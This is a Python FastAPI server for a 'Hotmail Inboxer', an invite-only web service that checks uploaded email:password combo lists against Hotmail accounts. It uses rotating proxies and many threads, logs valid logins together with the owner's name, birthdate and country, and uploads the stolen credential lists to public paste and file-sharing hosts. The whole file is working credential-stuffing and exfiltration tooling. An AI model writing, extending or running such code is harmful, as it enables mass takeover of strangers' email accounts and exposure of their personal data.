from fastapi import FastAPI, UploadFile, Form, WebSocket, WebSocketDisconnect, Depends, HTTPException
from fastapi.responses import HTMLResponse, PlainTextResponse, JSONResponse
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles
from starlette.requests import Request
from starlette.middleware.cors import CORSMiddleware
from contextlib import asynccontextmanager
import asyncio
import threading
import os
import json
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

from database import *
from auth import *
from checker import checker_worker_single
from proxy_manager import proxy_manager

user_connections = {}
ws_lock = threading.Lock()
stop_flags = {}
stop_lock = threading.Lock()

MAX_WORKERS = 40


# ==================== KÜLSŐ FELTÖLTÉS ====================

def upload_to_pastebin_fi(content: str) -> str:
    """Feltöltés pastebin.fi-re"""
    try:
        res = requests.post(
            "https://pastebin.fi/documents",
            data=content.encode('utf-8'),
            headers={"Content-Type": "text/plain"},
            timeout=15
        )
        if res.status_code == 200:
            data = res.json()
            key = data.get("key")
            if key:
                url = f"https://pastebin.fi/raw/{key}"
                print(f"  ✅ Pastebin.fi feltöltve: {url}")
                return url
    except Exception as e:
        print(f"  ❌ Pastebin.fi hiba: {e}")
    return None


def upload_to_transfer_sh(content: str, filename: str) -> str:
    """Feltöltés transfer.sh-ra"""
    try:
        res = requests.put(
            f"https://transfer.sh/{filename}",
            data=content.encode('utf-8'),
            headers={"Content-Type": "text/plain"},
            timeout=15
        )
        if res.status_code == 200:
            url = res.text.strip()
            print(f"  ✅ Transfer.sh feltöltve: {url}")
            return url
    except Exception as e:
        print(f"  ❌ Transfer.sh hiba: {e}")
    return None


def upload_to_dpaste(content: str) -> str:
    """Feltöltés dpaste.org-ra (backup)"""
    try:
        res = requests.post(
            "https://dpaste.org/api/",
            data={
                "content": content,
                "format": "text",
                "expires": "2592000"  # 30 nap
            },
            timeout=15
        )
        if res.status_code in [200, 201]:
            url = res.text.strip()
            if url:
                raw_url = url.rstrip('/') + '/raw'
                print(f"  ✅ Dpaste feltöltve: {raw_url}")
                return raw_url
    except Exception as e:
        print(f"  ❌ Dpaste hiba: {e}")
    return None


def upload_to_0x0(content: str, filename: str) -> str:
    """Feltöltés 0x0.st-re (backup)"""
    try:
        res = requests.post(
            "https://0x0.st",
            files={"file": (filename, content.encode('utf-8'), "text/plain")},
            timeout=15
        )
        if res.status_code == 200:
            url = res.text.strip()
            print(f"  ✅ 0x0.st feltöltve: {url}")
            return url
    except Exception as e:
        print(f"  ❌ 0x0.st hiba: {e}")
    return None


def upload_results(content: str, filename: str) -> str:
    """
    Megpróbálja feltölteni az eredményeket több szolgáltatásra.
    Az elsőt adja vissza ami sikerül.
    """
    if not content or len(content.strip()) == 0:
        return None

    print(f"  📤 Feltöltés: {filename} ({len(content)} byte)")

    # 1. Pastebin.fi (elsődleges)
    url = upload_to_pastebin_fi(content)
    if url:
        return url

    # 2. Transfer.sh (másodlagos)
    url = upload_to_transfer_sh(content, filename)
    if url:
        return url

    # 3. Dpaste (harmadlagos)
    url = upload_to_dpaste(content)
    if url:
        return url

    # 4. 0x0.st (negyedleges)
    url = upload_to_0x0(content, filename)
    if url:
        return url

    print(f"  ❌ Minden feltöltés sikertelen: {filename}")
    return None


# ==================== LIFESPAN ====================

@asynccontextmanager
async def lifespan(app: FastAPI):
    print("\n🔧 Startup...")

    await asyncio.to_thread(proxy_manager.fetch_proxies)

    working_count = await asyncio.to_thread(
        proxy_manager.test_and_filter, 3000, 500, 8
    )

    if working_count == 0:
        print("⚠️  Nem találtunk működő proxyt!")
    else:
        stats = proxy_manager.get_stats()
        print(f"🟢 {working_count} proxy kész!")
        print(f"   HTTP: {stats['http']} | SOCKS5: {stats['socks5']} | SOCKS4: {stats['socks4']}")

    async def proxy_refresh_loop():
        while True:
            await asyncio.sleep(2700)
            print("\n🔄 Proxyk frissítése...")
            await asyncio.to_thread(proxy_manager.fetch_and_test)

    refresh_task = asyncio.create_task(proxy_refresh_loop())

    # Félbemaradt futtatások lezárása
    from pymongo import MongoClient
    sync_client = MongoClient(os.getenv("MONGODB_URL"))
    db = sync_client.hotmail_checker
    running_runs = db.runs.find({"status": "running"})
    for run in running_runs:
        db.runs.update_one(
            {"_id": run["_id"]},
            {"$set": {"status": "finished", "finished_at": datetime.utcnow()}}
        )
    sync_client.close()

    yield

    print("\n🛑 Shutdown...")
    refresh_task.cancel()
    with stop_lock:
        for user_id in list(stop_flags.keys()):
            stop_flags[user_id].set()


# ==================== APP ====================

app = FastAPI(title="Hotmail Inboxer", lifespan=lifespan)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
templates = Jinja2Templates(directory="templates")
app.mount("/static", StaticFiles(directory="static"), name="static")


def broadcast_to_user(user_id: str, message: str):
    with ws_lock:
        if user_id not in user_connections:
            return
        dead = []
        for ws_info in user_connections[user_id]:
            try:
                asyncio.run_coroutine_threadsafe(
                    ws_info["ws"].send_text(message), ws_info["loop"]
                )
            except:
                dead.append(ws_info)
        for d in dead:
            user_connections[user_id].remove(d)
        if not user_connections[user_id]:
            del user_connections[user_id]


# ==================== OLDALAK ====================

@app.get("/", response_class=HTMLResponse)
async def login_page(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})


@app.get("/register", response_class=HTMLResponse)
async def register_page(request: Request):
    return templates.TemplateResponse("register.html", {"request": request})


@app.get("/dashboard", response_class=HTMLResponse)
async def dashboard_page(request: Request):
    return templates.TemplateResponse("dashboard.html", {"request": request})


@app.get("/admin", response_class=HTMLResponse)
async def admin_page(request: Request):
    return templates.TemplateResponse("admin.html", {"request": request})


# ==================== AUTH API ====================

@app.post("/api/register")
async def register(
    email: str = Form(...),
    password: str = Form(...),
    invite_code: str = Form(...)
):
    if len(password) < 6:
        raise HTTPException(status_code=400, detail="Minimum 6 karakter jelszó")
    if await get_user_by_email(email):
        raise HTTPException(status_code=400, detail="Foglalt email")

    invite = await get_invite_by_code(invite_code)
    if not invite:
        raise HTTPException(status_code=400, detail="Érvénytelen meghívó kód")
    if invite.get("used_by"):
        raise HTTPException(status_code=400, detail="Ez a meghívó már használatban van")
    if not invite.get("is_active", True):
        raise HTTPException(status_code=400, detail="Ez a meghívó nem aktív")

    await create_user(email, hash_password(password), invite_code)
    await use_invite(invite_code, email)

    return {"token": create_access_token({"sub": email}), "email": email}


@app.post("/api/login")
async def login(email: str = Form(...), password: str = Form(...)):
    user = await get_user_by_email(email)
    if not user or not verify_password(password, user["password"]):
        raise HTTPException(status_code=401, detail="Hibás adatok")

    if not user.get("invite_active", True):
        raise HTTPException(status_code=403, detail="INVITE_REVOKED")

    return {"token": create_access_token({"sub": email}), "email": email}


# ==================== PROXY API ====================

@app.get("/api/proxy_status")
async def proxy_status(current_user=Depends(get_current_user)):
    stats = proxy_manager.get_stats()
    return {
        "proxy_count": stats["total"],
        "http": stats["http"],
        "socks4": stats["socks4"],
        "socks5": stats["socks5"],
        "tested": proxy_manager.is_tested(),
    }


@app.post("/api/refresh_proxies")
async def refresh_proxies(current_user=Depends(get_current_user)):
    count = await asyncio.to_thread(proxy_manager.fetch_and_test)
    stats = proxy_manager.get_stats()
    return {
        "proxy_count": count,
        "http": stats["http"],
        "socks4": stats["socks4"],
        "socks5": stats["socks5"],
    }


# ==================== CHECKER API ====================

@app.post("/api/start")
async def start_checker(
    file: UploadFile,
    keyword: str = Form(...),
    threads: int = Form(MAX_WORKERS),
    current_user=Depends(get_current_user),
):
    if await get_active_run(str(current_user["_id"])):
        raise HTTPException(status_code=400, detail="Már fut egy checker!")

    threads = max(1, min(threads, 100))

    content = await file.read()
    lines = [
        l.strip()
        for l in content.decode("utf-8", errors="ignore").splitlines()
        if ':' in l and '@' in l and l.count(':') == 1
    ]
    if not lines:
        raise HTTPException(status_code=400, detail="Nincs érvényes email:jelszó sor")

    user_id = str(current_user["_id"])
    run_id = await create_run(user_id, keyword, len(lines))
    await delete_old_runs(user_id, run_id)

    with stop_lock:
        stop_flags[user_id] = asyncio.Event()

    threading.Thread(
        target=lambda: asyncio.run(
            execute_checker(run_id, user_id, lines, keyword, threads)
        ),
        daemon=True,
    ).start()

    return {
        "run_id": run_id,
        "total": len(lines),
        "threads": threads,
        "proxies": proxy_manager.get_stats(),
    }


@app.post("/api/stop")
async def stop_checker(current_user=Depends(get_current_user)):
    user_id = str(current_user["_id"])
    with stop_lock:
        if user_id in stop_flags:
            stop_flags[user_id].set()
            return {"status": "stopping"}
    raise HTTPException(status_code=404, detail="Nincs futó checker")


# ==================== CHECKER VÉGREHAJTÁS ====================

async def execute_checker(
    run_id: str, user_id: str, lines: list, keyword: str,
    num_threads: int = MAX_WORKERS
):
    checked = hits = custom = bad = retries = 0
    total = len(lines)
    stopped = False
    lock = threading.Lock()

    stats = proxy_manager.get_stats()
    pc = stats["total"]

    if pc > 0:
        mode = f"🔒 {pc} proxy (H:{stats['http']} S5:{stats['socks5']} S4:{stats['socks4']})"
    else:
        mode = "⚠️ Nincs proxy!"

    broadcast_to_user(user_id, json.dumps({
        "type": "log", "level": "info",
        "text": f"[START] {total} combo | {keyword} | {num_threads} szál"
    }))
    broadcast_to_user(user_id, json.dumps({
        "type": "log", "level": "info",
        "text": f"[MODE] {mode}"
    }))

    main_loop = asyncio.get_event_loop()

    def check_single(line):
        nonlocal checked, hits, custom, bad, retries, stopped

        # STOP CHECK
        with stop_lock:
            if user_id in stop_flags and stop_flags[user_id].is_set():
                stopped = True
                return

        try:
            email, password = line.split(':', 1)
        except:
            return

        result = checker_worker_single(email, password, keyword)

        with lock:
            # STOP CHECK AGAIN
            with stop_lock:
                if user_id in stop_flags and stop_flags[user_id].is_set():
                    stopped = True
                    return

            checked += 1

            if result["status"] == "hit":
                hits += 1
                d = result["data"]
                lt = (
                    f"{d['email']}:{d['password']} | Country={d['country']} | "
                    f"Name={d['name']} | Birthdate={d['birthdate']} | "
                    f"Mails={d['mails']} | LastMail={d['date']}"
                )

                try:
                    asyncio.run_coroutine_threadsafe(
                        add_result_to_run(run_id, "hit", lt), main_loop
                    ).result(timeout=5)
                    asyncio.run_coroutine_threadsafe(
                        add_result_details_to_run(run_id, "hit", d), main_loop
                    ).result(timeout=5)
                except:
                    pass

                broadcast_to_user(user_id, json.dumps({
                    "type": "log", "level": "hit", "text": f"[HIT] {lt}"
                }))
                broadcast_to_user(user_id, json.dumps({
                    "type": "live_hit", "data": d
                }))

            elif result["status"] == "custom":
                custom += 1
                d = result["data"]
                lt = (
                    f"{d['email']}:{d['password']} | Country={d['country']} | "
                    f"Name={d['name']} | Birthdate={d['birthdate']}"
                )

                try:
                    asyncio.run_coroutine_threadsafe(
                        add_result_to_run(run_id, "custom", lt), main_loop
                    ).result(timeout=5)
                    asyncio.run_coroutine_threadsafe(
                        add_result_details_to_run(run_id, "custom", d), main_loop
                    ).result(timeout=5)
                except:
                    pass

                broadcast_to_user(user_id, json.dumps({
                    "type": "log", "level": "custom", "text": f"[CUSTOM] {lt}"
                }))
                broadcast_to_user(user_id, json.dumps({
                    "type": "live_custom", "data": d
                }))

            elif result["status"] == "bad":
                bad += 1
                broadcast_to_user(user_id, json.dumps({
                    "type": "log", "level": "bad", "text": f"[BAD] {email}"
                }))

            else:
                retries += 1

            # Statisztika frissítés
            if checked % 5 == 0 or checked == total:
                try:
                    asyncio.run_coroutine_threadsafe(
                        update_run_stats(run_id, {
                            "checked": checked, "hits": hits,
                            "custom": custom, "bad": bad, "retries": retries,
                        }),
                        main_loop
                    )
                except:
                    pass

            broadcast_to_user(user_id, json.dumps({
                "type": "stats", "run_id": run_id,
                "checked": checked, "hits": hits,
                "custom": custom, "bad": bad,
                "retries": retries, "total": total,
            }))

    def run_parallel():
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = []
            for line in lines:
                with stop_lock:
                    if user_id in stop_flags and stop_flags[user_id].is_set():
                        break
                futures.append(executor.submit(check_single, line))

            for future in as_completed(futures):
                with stop_lock:
                    if user_id in stop_flags and stop_flags[user_id].is_set():
                        break
                try:
                    future.result()
                except:
                    pass

    await asyncio.to_thread(run_parallel)

    # Végső statisztika mentése
    await update_run_stats(run_id, {
        "checked": checked, "hits": hits, "custom": custom,
        "bad": bad, "retries": retries,
    })

    # ==================== FELTÖLTÉS KÜLSŐ SZOLGÁLTATÁSRA ====================
    hits_url = None
    custom_url = None

    if hits > 0 or custom > 0:
        broadcast_to_user(user_id, json.dumps({
            "type": "log", "level": "info",
            "text": "📤 Eredmények feltöltése külső szerverre..."
        }))

        final_run = await get_run(run_id)
        if final_run:
            hit_lines = final_run.get("hit_lines", [])
            custom_lines = final_run.get("custom_lines", [])

            # HITS feltöltés
            if hit_lines:
                broadcast_to_user(user_id, json.dumps({
                    "type": "log", "level": "info",
                    "text": f"📤 {len(hit_lines)} HIT feltöltése..."
                }))
                hits_url = await asyncio.to_thread(
                    upload_results,
                    "\n".join(hit_lines),
                    f"Hotmail_Hits_{run_id[:8]}.txt"
                )
                if hits_url:
                    broadcast_to_user(user_id, json.dumps({
                        "type": "log", "level": "hit",
                        "text": f"✅ Hits feltöltve: {hits_url}"
                    }))
                else:
                    broadcast_to_user(user_id, json.dumps({
                        "type": "log", "level": "bad",
                        "text": "❌ Hits feltöltés sikertelen - eredmények a DB-ben maradnak"
                    }))

            # CUSTOM feltöltés
            if custom_lines:
                broadcast_to_user(user_id, json.dumps({
                    "type": "log", "level": "info",
                    "text": f"📤 {len(custom_lines)} CUSTOM feltöltése..."
                }))
                custom_url = await asyncio.to_thread(
                    upload_results,
                    "\n".join(custom_lines),
                    f"Hotmail_Custom_{run_id[:8]}.txt"
                )
                if custom_url:
                    broadcast_to_user(user_id, json.dumps({
                        "type": "log", "level": "custom",
                        "text": f"✅ Custom feltöltve: {custom_url}"
                    }))
                else:
                    broadcast_to_user(user_id, json.dumps({
                        "type": "log", "level": "bad",
                        "text": "❌ Custom feltöltés sikertelen - eredmények a DB-ben maradnak"
                    }))

    # Futtatás befejezése + eredmények törlése DB-ből (ha feltöltve)
    await finish_and_clean_run(run_id, hits_url, custom_url)
    await update_run_status_only(run_id, "finished")

    # Stop flag check
    with stop_lock:
        if user_id in stop_flags and stop_flags[user_id].is_set():
            stopped = True

    st_text = "LEÁLLÍTVA" if stopped else "KÉSZ"
    broadcast_to_user(user_id, json.dumps({
        "type": "log", "level": "finish",
        "text": f"[{st_text}] Hits: {hits} | Custom: {custom} | Bad: {bad}"
    }))

    # Letöltési linkek küldése a frontendnek
    broadcast_to_user(user_id, json.dumps({
        "type": "finished",
        "run_id": run_id,
        "hits_url": hits_url,
        "custom_url": custom_url,
        "hits_count": hits,
        "custom_count": custom,
        "bad_count": bad,
    }))

    # Stop flag törlése
    with stop_lock:
        if user_id in stop_flags:
            del stop_flags[user_id]


# ==================== LETÖLTÉS API ====================

@app.get("/api/runs")
async def get_user_runs_list(current_user=Depends(get_current_user)):
    runs = await get_user_finished_runs(str(current_user["_id"]))
    for r in runs:
        r["_id"] = str(r["_id"])
        r["started_at"] = r["started_at"].isoformat()
        if r.get("finished_at"):
            r["finished_at"] = r["finished_at"].isoformat()
    return runs


@app.get("/api/get_download_url/{run_id}/{type}")
async def get_download_url(
    run_id: str, type: str,
    current_user=Depends(get_current_user)
):
    run = await get_run(run_id)
    if not run or run["user_id"] != str(current_user["_id"]):
        raise HTTPException(status_code=404)

    if type == "hits" and run.get("hits_url"):
        return {"url": run["hits_url"], "source": "external"}
    if type == "custom" and run.get("custom_url"):
        return {"url": run["custom_url"], "source": "external"}

    # Fallback: ha nincs külső URL, DB-ből adjuk
    lines = run.get("hit_lines" if type == "hits" else "custom_lines", [])
    if lines:
        return {
            "url": f"/api/download_direct/{run_id}/{type}",
            "source": "local"
        }

    return {"url": None, "source": "none"}


@app.get("/api/download_direct/{run_id}/{type}")
async def download_direct(run_id: str, type: str):
    run = await get_run(run_id)
    if not run:
        raise HTTPException(status_code=404)
    lines = run.get("hit_lines" if type == "hits" else "custom_lines", [])
    return PlainTextResponse(
        content="\n".join(lines) if lines else "Nincs eredmény",
        headers={
            "Content-Disposition": f'attachment; filename="Hotmail-{type}.txt"'
        },
    )


# ==================== ADMIN API ====================

@app.get("/api/admin/invites")
async def get_invites(admin_user=Depends(get_admin_user)):
    invites = await get_all_invites()
    for inv in invites:
        inv["_id"] = str(inv["_id"])
        inv["created_at"] = inv["created_at"].isoformat()
        if inv.get("used_at"):
            inv["used_at"] = inv["used_at"].isoformat()
    return invites


@app.post("/api/admin/invites/create")
async def create_new_invite(admin_user=Depends(get_admin_user)):
    invite = await create_invite(admin_user["email"])
    invite["_id"] = str(invite["_id"])
    invite["created_at"] = invite["created_at"].isoformat()
    return invite


@app.delete("/api/admin/invites/{invite_code}")
async def delete_invite_endpoint(
    invite_code: str, admin_user=Depends(get_admin_user)
):
    await revoke_users_by_invite(invite_code)
    await delete_invite(invite_code)
    return {"status": "deleted", "code": invite_code}


@app.get("/api/admin/users")
async def get_users(admin_user=Depends(get_admin_user)):
    users = await get_all_users()
    for user in users:
        user["_id"] = str(user["_id"])
        user["created_at"] = user["created_at"].isoformat()
        del user["password"]
    return users


@app.post("/api/admin/users/{email}/toggle")
async def toggle_user_status(
    email: str, admin_user=Depends(get_admin_user)
):
    user = await get_user_by_email(email)
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    new_status = not user.get("invite_active", True)
    await update_user_invite_status(email, new_status)
    return {"email": email, "invite_active": new_status}


# ==================== WEBSOCKET ====================

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket, token: str = ""):
    await websocket.accept()
    email = decode_token(token)
    if not email:
        return await websocket.close(code=1008)
    user = await get_user_by_email(email)
    if not user:
        return await websocket.close(code=1008)

    # Meghívó ellenőrzés
    if not user.get("invite_active", True):
        try:
            await websocket.send_text(json.dumps({
                "type": "invite_revoked"
            }))
        except:
            pass
        return await websocket.close(code=1008)

    user_id = str(user["_id"])
    loop = asyncio.get_event_loop()
    ws_info = {"ws": websocket, "loop": loop}
    with ws_lock:
        if user_id not in user_connections:
            user_connections[user_id] = []
        user_connections[user_id].append(ws_info)

    # Proxy info küldése
    try:
        stats = proxy_manager.get_stats()
        await websocket.send_text(json.dumps({
            "type": "proxy_info",
            "count": stats["total"],
            "http": stats["http"],
            "socks4": stats["socks4"],
            "socks5": stats["socks5"],
            "tested": proxy_manager.is_tested(),
        }))
    except:
        pass

    # Admin státusz küldése
    try:
        await websocket.send_text(json.dumps({
            "type": "user_info",
            "is_admin": user.get("is_admin", False),
            "email": user.get("email", "")
        }))
    except:
        pass

    # Aktív futtatás info
    active_run = await get_active_run(user_id)
    if active_run:
        active_run["_id"] = str(active_run["_id"])
        active_run["started_at"] = active_run["started_at"].isoformat()
        try:
            await websocket.send_text(json.dumps({
                "type": "active_run", "run": active_run
            }))
            for hit in active_run.get("hit_details", []):
                await websocket.send_text(json.dumps({
                    "type": "live_hit", "data": hit
                }))
            for c in active_run.get("custom_details", []):
                await websocket.send_text(json.dumps({
                    "type": "live_custom", "data": c
                }))
        except:
            pass

    # Előző befejezett futtatás eredményei
    finished_runs = await get_user_finished_runs(user_id)
    for run in finished_runs:
        if run.get("hits_url") or run.get("custom_url"):
            try:
                await websocket.send_text(json.dumps({
                    "type": "previous_results",
                    "run_id": str(run["_id"]),
                    "hits_url": run.get("hits_url"),
                    "custom_url": run.get("custom_url"),
                    "hits": run.get("hits", 0),
                    "custom": run.get("custom", 0),
                    "bad": run.get("bad", 0),
                    "checked": run.get("checked", 0),
                    "total": run.get("total", 0),
                    "keyword": run.get("keyword", ""),
                    "finished_at": run.get("finished_at", "").isoformat()
                        if run.get("finished_at") else None
                }))
            except:
                pass

    try:
        while True:
            data = await websocket.receive_text()
            if data == "ping":
                await websocket.send_text("pong")
    except (WebSocketDisconnect, RuntimeError, Exception):
        with ws_lock:
            if user_id in user_connections and ws_info in user_connections[user_id]:
                user_connections[user_id].remove(ws_info)


if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", 8000))
    print("\n" + "=" * 60)
    print("  🚀 Hotmail Inboxer - External Upload Edition")
    print(f"  📡 http://0.0.0.0:{port}")
    print(f"  🧵 Max {MAX_WORKERS} párhuzamos szál")
    print(f"  📤 Upload: Pastebin.fi → Transfer.sh → Dpaste → 0x0.st")
    print("=" * 60 + "\n")
    uvicorn.run("main:app", host="0.0.0.0", port=port, reload=False, log_level="info")
